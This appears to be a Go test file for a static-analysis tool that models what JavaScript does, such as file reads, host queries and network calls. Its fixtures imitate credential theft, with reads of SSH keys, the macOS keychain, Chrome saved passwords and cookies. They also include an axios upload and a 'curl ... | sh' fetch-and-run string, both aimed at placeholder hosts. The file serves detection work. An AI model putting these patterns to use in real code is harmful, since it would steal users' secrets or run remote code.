package extract

import (
	"fmt"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func javaScriptAPIExtract(source string) behavior.Graph {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID: "node-javascript-api", LogicalPath: "fixture.js", PhysicalPath: "/private/test/fixture.js",
		Kind: "script", MediaType: "text/javascript", SemanticLanguage: "javascript", Data: []byte(source),
	})
	return graph
}

func javaScriptAPIOperation(graph behavior.Graph, kind behavior.OperationKind, role behavior.ResourceRole, value string) (behavior.ModeledOperation, bool) {
	var fallback behavior.ModeledOperation
	found := false
	for _, operation := range graph.Operations {
		if operation.Kind != kind {
			continue
		}
		for _, binding := range operation.ResourceBindings {
			if binding.Role == role && binding.Resource.Value == value {
				if operation.Qualifiers["api_identity"] == "stable-node-builtin-binding-and-exact-call" {
					return operation, true
				}
				fallback, found = operation, true
			}
		}
	}
	return fallback, found
}

func TestJavaScriptSourceAPIsUseSharedOperationsAndExactResources(t *testing.T) {
	graph := javaScriptAPIExtract(`import * as fs from "node:fs";
import {copyFile as copy} from "node:fs/promises";
const os = require("os");
const dnsPromises = require("node:dns/promises");

function inspectHost() {
  fs.readFileSync("/Users/alice/.ssh/id_ed25519");
  fs.writeFileSync("/tmp/stage", "data");
  fs.readdirSync("/Users/alice/Library/Application Support");
  fs.mkdirSync("/tmp/output", {recursive: true});
  copy("/tmp/stage", "/tmp/output/stage");
  os.hostname();
  os.userInfo();
  dnsPromises.lookup("collector.example.invalid");
}`)

	wants := []struct {
		kind  behavior.OperationKind
		role  behavior.ResourceRole
		value string
	}{
		{behavior.OperationFileRead, behavior.ResourceRoleSource, "/Users/alice/.ssh/id_ed25519"},
		{behavior.OperationFileWrite, behavior.ResourceRoleLocalOutput, "/tmp/stage"},
		{behavior.OperationFileEnumerate, behavior.ResourceRoleSource, "/Users/alice/Library/Application Support"},
		{behavior.OperationDirectoryCreate, behavior.ResourceRoleTarget, "/tmp/output"},
		{behavior.OperationFileCopy, behavior.ResourceRoleSource, "/tmp/stage"},
		{behavior.OperationFileCopy, behavior.ResourceRoleLocalOutput, "/tmp/output/stage"},
		{behavior.OperationSystemInfoQuery, behavior.ResourceRoleSource, "macOS system and hardware"},
		{behavior.OperationUserInfoQuery, behavior.ResourceRoleSource, "local user"},
		{behavior.OperationNameResolve, behavior.ResourceRoleSource, "collector.example.invalid"},
	}
	for _, want := range wants {
		operation, ok := javaScriptAPIOperation(graph, want.kind, want.role, want.value)
		if !ok {
			t.Errorf("missing %s %s=%q: %#v", want.kind, want.role, want.value, graph.Operations)
			continue
		}
		if operation.Support != behavior.SupportCorroborated || len(operation.EvidenceIDs) < 2 || operation.SourceFunction != "inspectHost" {
			t.Errorf("operation lacks exact binding/call proof or scope: %#v", operation)
		}
		if operation.Qualifiers["api_identity"] != "stable-node-builtin-binding-and-exact-call" {
			t.Errorf("operation identity qualifier = %#v", operation.Qualifiers)
		}
	}
}

func TestJavaScriptSourceAPIsSupportCommonJSDestructuringAndPromises(t *testing.T) {
	graph := javaScriptAPIExtract(`const { readFileSync: read } = require("fs");
const fsp = require("fs").promises;
const { resolve4 } = require("dns/promises");
read("/tmp/input");
fsp.rename("/tmp/input", "/tmp/output");
resolve4("example.invalid");`)
	for _, want := range []struct {
		kind  behavior.OperationKind
		role  behavior.ResourceRole
		value string
	}{
		{behavior.OperationFileRead, behavior.ResourceRoleSource, "/tmp/input"},
		{behavior.OperationFileMove, behavior.ResourceRoleTarget, "/tmp/output"},
		{behavior.OperationNameResolve, behavior.ResourceRoleSource, "example.invalid"},
	} {
		if _, ok := javaScriptAPIOperation(graph, want.kind, want.role, want.value); !ok {
			t.Errorf("missing %#v: %#v", want, graph.Operations)
		}
	}
}

func TestJavaScriptSourceAPIsSupportDocumentedCallbackForms(t *testing.T) {
	graph := javaScriptAPIExtract(`const fs = require("fs");
fs.readFile("/tmp/input", "utf8", callback);
fs.writeFile("/tmp/output", "data", callback);
fs.rename("/tmp/output", "/tmp/final", callback);`)
	for _, want := range []struct {
		kind  behavior.OperationKind
		role  behavior.ResourceRole
		value string
	}{
		{behavior.OperationFileRead, behavior.ResourceRoleSource, "/tmp/input"},
		{behavior.OperationFileWrite, behavior.ResourceRoleLocalOutput, "/tmp/output"},
		{behavior.OperationFileMove, behavior.ResourceRoleTarget, "/tmp/final"},
	} {
		if _, ok := javaScriptAPIOperation(graph, want.kind, want.role, want.value); !ok {
			t.Errorf("missing callback API operation %#v: %#v", want, graph.Operations)
		}
	}
}

func TestJavaScriptSourceAPIsCoverNeutralOpenMetadataAndTruncatePrimitives(t *testing.T) {
	graph := javaScriptAPIExtract(`const fs = require("fs");
const fsp = require("fs/promises");
fs.open("/tmp/input", "r", callback);
fs.readlinkSync("/tmp/link");
fs.realpath("/tmp/item", callback);
fs.truncateSync("/tmp/output", 0);
fsp.open("/tmp/promise-input", "r");
fsp.truncate("/tmp/promise-output", 0);`)
	for _, want := range []struct {
		kind  behavior.OperationKind
		role  behavior.ResourceRole
		value string
	}{
		{behavior.OperationFileOpen, behavior.ResourceRoleSource, "/tmp/input"},
		{behavior.OperationFileMetadataQuery, behavior.ResourceRoleSource, "/tmp/link"},
		{behavior.OperationFileMetadataQuery, behavior.ResourceRoleSource, "/tmp/item"},
		{behavior.OperationFileWrite, behavior.ResourceRoleLocalOutput, "/tmp/output"},
		{behavior.OperationFileOpen, behavior.ResourceRoleSource, "/tmp/promise-input"},
		{behavior.OperationFileWrite, behavior.ResourceRoleLocalOutput, "/tmp/promise-output"},
	} {
		operation, ok := javaScriptAPIOperation(graph, want.kind, want.role, want.value)
		if !ok || operation.Support != behavior.SupportCorroborated {
			t.Errorf("missing exact neutral Node API operation %#v: %#v", want, graph.Operations)
		}
	}
}

func TestJavaScriptSourceAPIsRetainCallbackWithOpaqueBody(t *testing.T) {
	source := `const fs = require("fs");
const filePath = dynamicPath();
fs.readFile(filePath, "utf8", (_, data) => {
  try { consume(data); } catch (error) { observe(error); }
});`
	graph := javaScriptAPIExtract(source)
	if _, ok := javaScriptAPIOperation(graph, behavior.OperationFileRead, behavior.ResourceRoleSource, ""); !ok {
		prescan := prescanJavaScriptCommands(strings.Split(source, "\n"))
		t.Fatalf("callback API with opaque body was not retained: statements=%#v coverage=%#v", prescan.byLineStatements(), graph.Coverage)
	}
}

func TestJavaScriptSourceAPIsKeepPriorBindingWhenRequireEscapesLater(t *testing.T) {
	graph := javaScriptAPIExtract(`const fs = require("fs");
fs.readFile("/tmp/input", callback);
new Function("require", dynamicSource)(require);`)
	if _, ok := javaScriptAPIOperation(graph, behavior.OperationFileRead, behavior.ResourceRoleSource, "/tmp/input"); !ok {
		t.Fatalf("immutable prior module binding was discarded solely because require later escaped: %#v", graph.Operations)
	}
}

func TestJavaScriptSourceAPIsKeepDynamicResourcesUnresolved(t *testing.T) {
	graph := javaScriptAPIExtract(`import * as fs from "fs";
function collect(user) { fs.readFileSync("/Users/" + user + "/Library/Keychains/login.keychain-db"); }`)
	operation, ok := javaScriptAPIOperation(graph, behavior.OperationFileRead, behavior.ResourceRoleSource, "")
	if !ok || operation.Qualifiers["resource_binding"] != "unresolved" {
		t.Fatalf("dynamic resource was fabricated or omitted: %#v", graph.Operations)
	}
	for _, binding := range operation.ResourceBindings {
		if strings.Contains(binding.Resource.Value, "/Users//") {
			t.Fatalf("partial concatenation became a fake path: %#v", operation)
		}
	}
}

func TestJavaScriptSourceAPIsResolveImmutableLiteralResourceWithLineage(t *testing.T) {
	graph := javaScriptAPIExtract(`const fs = require("fs");
const target = "/Users/alice/Library/Application Support/Browser/Cookies";
fs.readFileSync(target);`)
	operation, ok := javaScriptAPIOperation(graph, behavior.OperationFileRead, behavior.ResourceRoleSource, "/Users/alice/Library/Application Support/Browser/Cookies")
	if !ok || len(operation.EvidenceIDs) != 3 {
		t.Fatalf("literal alias did not retain binding, assignment, and call lineage: %#v", graph.Operations)
	}
	var assignment bool
	for _, evidenceID := range operation.EvidenceIDs {
		for _, evidence := range graph.Evidence {
			if evidence.ID == evidenceID && evidence.Kind == javaScriptCommandAssignmentEvidence && evidence.Line == 2 {
				assignment = true
			}
		}
	}
	if !assignment {
		t.Fatalf("literal assignment evidence is not linked to operation: operation=%#v evidence=%#v", operation, graph.Evidence)
	}
}

func TestJavaScriptSourceAPIsResolveExactStaticConcatenation(t *testing.T) {
	graph := javaScriptAPIExtract(`const fs = require("fs");
const home = "/Users/alice";
const family = "/Library/Application Support/Google/Chrome";
fs.readFileSync(home + family + "/Default/Login Data");`)
	operation, ok := javaScriptAPIOperation(graph, behavior.OperationFileRead, behavior.ResourceRoleSource, "/Users/alice/Library/Application Support/Google/Chrome/Default/Login Data")
	if !ok {
		t.Fatalf("exact static concatenation was not bound: %#v", graph.Operations)
	}
	resource := operation.RequiredResource()
	if !resource.HasClassification(behavior.ResourceClassBrowserPasswordStore) || operation.Qualifiers["resource_binding"] != "exact-static" {
		t.Fatalf("concatenated resource lost classification or proof: %#v", operation)
	}
	if len(operation.EvidenceIDs) < 4 {
		t.Fatalf("concatenated resource lost module, scalar, and call lineage: %#v", operation.EvidenceIDs)
	}
}

func TestJavaScriptStaticConcatenationRejectsCoercionAndMalformedOperators(t *testing.T) {
	prescan := prescanJavaScriptCommands([]string{`const prefix = "https://";`, `const host = "example.invalid";`})
	state := newJavaScriptCommandState(prescan)
	state.observe(`const prefix = "https://";`, "", 1)
	state.observe(`const host = "example.invalid";`, "", 2)
	if value, _, ok := state.resolveExpression(`"curl " + prefix + host + "/p | sh"`, "", 0); !ok || value != "curl https://example.invalid/p | sh" {
		t.Fatalf("exact string concatenation = %q, %v", value, ok)
	}
	for _, expression := range []string{`"/tmp/" + 7`, `"/tmp/" ++ suffix`, `"/tmp/" += suffix`, `"/tmp/" + dynamic()`, `"/tmp/" + (suffix)`} {
		negativePrescan := prescanJavaScriptCommands([]string{"const suffix = \"file\";"})
		negativeState := newJavaScriptCommandState(negativePrescan)
		negativeState.observe(`const suffix = "file";`, "", 1)
		if value, _, ok := negativeState.resolveExpression(expression, "", 0); ok {
			t.Fatalf("unsupported expression %q resolved as %q", expression, value)
		}
	}
}

func TestJavaScriptSourceAPIsDoNotProjectPartialTemplateResources(t *testing.T) {
	graph := javaScriptAPIExtract("const fs = require(\"fs\");\n" +
		"fs.readFileSync(`/Users/${account}/.ssh/id_ed25519`);\n")
	matched := false
	for _, operation := range graph.Operations {
		if operation.Kind != behavior.OperationFileRead {
			continue
		}
		matched = true
		resource := operation.RequiredResource()
		if resource.Value != "" {
			t.Fatalf("unresolved template became a fabricated exact file resource: %#v", operation)
		}
		if operation.Qualifiers["resource_binding"] != "unresolved" {
			t.Fatalf("unresolved template lacks an explicit resource qualifier: %#v", operation)
		}
	}
	if !matched {
		t.Fatalf("stable fs API call was lost when only its resource was dynamic: %#v", graph.Operations)
	}
}

func TestJavaScriptSourceAPIsEnrichRatherThanDuplicateSensitiveRead(t *testing.T) {
	graph := javaScriptAPIExtract(`const fs = require("fs");
fs.readFileSync("/Users/alice/.ssh/id_ed25519");`)
	count := 0
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationFileRead {
			count++
			if operation.Qualifiers["api"] != "fs.readFileSync" || len(operation.EvidenceIDs) < 2 {
				t.Fatalf("generic read was not enriched with exact API lineage: %#v", operation)
			}
		}
	}
	if count != 1 {
		t.Fatalf("one call produced %d file.read operations: %#v", count, graph.Operations)
	}
}

func TestJavaScriptSourceAPIsRetainTwoIdenticalCallsOnOneLine(t *testing.T) {
	graph := javaScriptAPIExtract(`const fs = require("fs");
fs.readFileSync("/Users/alice/.ssh/id_ed25519"); fs.readFileSync("/Users/alice/.ssh/id_ed25519");`)
	count := 0
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationFileRead && operation.Qualifiers["api"] == "fs.readFileSync" {
			count++
		}
	}
	if count != 2 {
		t.Fatalf("two exact calls produced %d API-backed reads: %#v", count, graph.Operations)
	}
}

func TestJavaScriptSourceAPIsRejectUnstableOrLookalikeBindings(t *testing.T) {
	tests := map[string]string{
		"dynamic module":       `const name = "fs"; const fs = require(name); fs.readFileSync("/tmp/no");`,
		"mutable binding":      `let fs = require("fs"); fs.readFileSync("/tmp/no");`,
		"unrelated module":     `const fs = require("fixture-fs"); fs.readFileSync("/tmp/no");`,
		"computed property":    `const fs = require("fs"); fs["readFileSync"]("/tmp/no");`,
		"spread arguments":     `const fs = require("fs"); fs.copyFileSync(...paths);`,
		"wrong arity":          `const fs = require("fs"); fs.copyFileSync("/tmp/only");`,
		"member replacement":   `const fs = require("fs"); fs.readFileSync = replacement; fs.readFileSync("/tmp/no");`,
		"bare alias escape":    `const fs = require("fs"); observe(fs); fs.readFileSync("/tmp/no");`,
		"string and comment":   `const marker = "require('fs').readFileSync('/tmp/no')"; // fs.readFileSync("/tmp/no")`,
		"callback missing":     `const dns = require("dns"); dns.lookup("example.invalid");`,
		"invalid fs callback":  `const fs = require("fs"); fs.readFile("/tmp/no", 7);`,
		"unknown fixed method": `const os = require("os"); os.notARealAPI();`,
		"shadowed require":     `var require = name => fixture[name]; const fs = require("fs"); fs.readFileSync("/tmp/no");`,
		"late module mutation": `const fs = require("fs");
function collect() {
  fs.readFileSync("/tmp/no");
}
fs.readFileSync = replacement;
collect();`,
	}
	for name, source := range tests {
		t.Run(name, func(t *testing.T) {
			graph := javaScriptAPIExtract(source)
			for _, operation := range graph.Operations {
				if operation.Qualifiers["api_identity"] == "stable-node-builtin-binding-and-exact-call" {
					t.Fatalf("lookalike produced Node API operation: %#v", operation)
				}
			}
		})
	}
}

func TestJavaScriptSourceAPIsRejectMalformedAndBoundedInput(t *testing.T) {
	malformed := javaScriptAPIExtract(`const fs = require("fs"); fs.readFileSync("/tmp/no";`)
	if len(malformed.Operations) != 0 {
		t.Fatalf("malformed call produced operations: %#v", malformed.Operations)
	}

	var source strings.Builder
	for i := 0; i < maxJavaScriptAPIBindings+2; i++ {
		fmt.Fprintf(&source, "const fs%d = require(\"fs\");\n", i)
	}
	limited := javaScriptAPIExtract(source.String())
	if !hasPartialCoverageArea(limited.Coverage, javaScriptAPIBindingAnalysisArea) {
		t.Fatalf("binding budget was not disclosed: %#v", limited.Coverage)
	}
}

func TestJavaScriptSourceAPIsBenignControlKeepsNeutralSemantics(t *testing.T) {
	graph := javaScriptAPIExtract(`import { readFileSync } from "node:fs";
import os from "node:os";
const preferences = readFileSync("/Library/Preferences/com.example.control.plist", "utf8");
console.log(os.platform(), preferences.length);`)
	if _, ok := javaScriptAPIOperation(graph, behavior.OperationFileRead, behavior.ResourceRoleSource, "/Library/Preferences/com.example.control.plist"); !ok {
		t.Fatalf("benign read was not retained: %#v", graph.Operations)
	}
	if _, ok := javaScriptAPIOperation(graph, behavior.OperationSystemInfoQuery, behavior.ResourceRoleSource, "macOS system and hardware"); !ok {
		t.Fatalf("benign system query was not retained: %#v", graph.Operations)
	}
	for _, operation := range graph.Operations {
		if strings.Contains(string(operation.Kind), "malware") || strings.Contains(string(operation.Kind), "steal") {
			t.Fatalf("neutral operation was classified as malicious: %#v", operation)
		}
	}
}

func TestJavaScriptNetworkRequiresStableBuiltinOrModuleIdentity(t *testing.T) {
	tests := map[string]string{
		"shadowed fetch":   `const fetch = fixture; fetch("https://shadowed.example.invalid/p");`,
		"parameter fetch":  `function collect(fetch) { fetch("https://parameter.example.invalid/p"); }`,
		"member fetch":     `client.fetch("https://member.example.invalid/p");`,
		"unbound axios":    `axios.get("https://unbound.example.invalid/p");`,
		"reassigned axios": `const axios = require("axios"); axios = fixture; axios.get("https://rebound.example.invalid/p");`,
	}
	for name, source := range tests {
		t.Run(name, func(t *testing.T) {
			graph := javaScriptAPIExtract(source)
			for _, operation := range graph.Operations {
				if operation.Kind == behavior.OperationNetworkConnect || operation.Kind == behavior.OperationNetworkDownload || operation.Kind == behavior.OperationNetworkUpload {
					t.Fatalf("unproved JavaScript API identity became network behavior: %#v", operation)
				}
			}
		})
	}
}

func TestJavaScriptNetworkRetainsExactFetchAndAxiosIdentity(t *testing.T) {
	graph := javaScriptAPIExtract(`fetch("https://fetch.example.invalid/p");
const axios = require("axios");
axios.get("https://axios.example.invalid/p");
axios.post("https://upload.example.invalid/p", payload);`)
	wants := map[string]string{
		"https://fetch.example.invalid/p": "fetch",
		"https://axios.example.invalid/p": "axios.get",
	}
	for destination, api := range wants {
		found := false
		for _, operation := range graph.Operations {
			if operationHasNetworkDestination(operation, destination) && operation.Qualifiers["api"] == api && len(operation.EvidenceIDs) >= 1 {
				found = true
			}
		}
		if !found {
			t.Errorf("missing identity-proven %s request to %s: %#v", api, destination, graph.Operations)
		}
	}
	var upload bool
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationNetworkUpload && operationHasNetworkDestination(operation, "https://upload.example.invalid/p") &&
			operation.Qualifiers["api"] == "axios.post" && operation.Qualifiers["api_identity"] == "stable-javascript-module-binding-and-exact-call" {
			upload = true
		}
	}
	if !upload {
		t.Fatalf("exact axios request body was not modeled as upload: %#v", graph.Operations)
	}
}

func TestJavaScriptAxiosKeepsDynamicDestinationUnresolved(t *testing.T) {
	graph := javaScriptAPIExtract(`const axios = require("axios");
axios.get(endpoint);`)
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationNetworkConnect && operation.Qualifiers["api"] == "axios.get" &&
			operation.Qualifiers["resource_binding"] == "unresolved" && operation.RequiredResource().Kind == behavior.ResourceURL && operation.RequiredResource().Value == "" {
			return
		}
	}
	t.Fatalf("exact axios call with dynamic endpoint was hidden: %#v", graph.Operations)
}

func TestJavaScriptSourceAPIsResolveExactBundledNodeBuiltin(t *testing.T) {
	graph := javaScriptAPIExtract(`(() => {
var modules = {
41: module => { module.exports = require("node:fs"); }
};
function load(id) {
var retained = {exports:{}};
modules[id](retained, retained.exports, load);
return retained.exports;
}
var files = load(41);
function collect() {
files.readFileSync("/Users/alice/Library/Keychains/login.keychain-db");
}
})();`)
	operation, ok := javaScriptAPIOperation(graph, behavior.OperationFileRead, behavior.ResourceRoleSource, "/Users/alice/Library/Keychains/login.keychain-db")
	if !ok || operation.Qualifiers["api"] != "fs.readFileSync" || operation.Support != behavior.SupportCorroborated {
		t.Fatalf("exact bundled fs binding was not recovered: %#v", graph.Operations)
	}
	for _, kind := range []string{"javascript-bundle-module-wrapper", "javascript-bundle-loader-dispatch", "javascript-bundle-module-binding"} {
		if !hasJavaScriptCommandEvidenceKind(graph.Evidence, kind) {
			t.Errorf("missing bundle proof %q: %#v", kind, graph.Evidence)
		}
	}
}
